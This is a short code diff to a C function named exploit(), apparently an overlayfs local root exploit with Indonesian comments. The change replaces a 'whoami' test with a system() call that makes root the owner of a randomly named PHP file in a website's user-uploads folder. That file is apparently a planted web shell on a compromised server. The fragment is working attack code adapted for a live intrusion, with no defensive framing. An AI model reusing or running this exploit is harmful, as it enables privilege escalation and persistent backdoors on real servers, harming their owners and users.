@@ -92,8 +92,10 @@ static int exploit() {
     if (mount("overlay", DIR_MERGE, "overlay", 0, buf) == -1)
         err(1, "mount %s", DIR_MERGE);
 
-    // Ganti system("whoami") dengan eksekusi /tmp/rooting/./y
-    system("chown root:root /var/www/html/rds/2025/public/uploads/users/1742104052_681c17d36b38f11547f6.php);
+    
+
+    // Ganti dengan perintah 'chown root:root' untuk file tertentu
+    system("chown root:root /var/www/html/rds/2025/public/uploads/users/1742104052_681c17d36b38f11547f6.php");
 
     // all+ep
     char cap[] = "\x01\x00\x00\x02\xff\xff\xff\xff\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00";
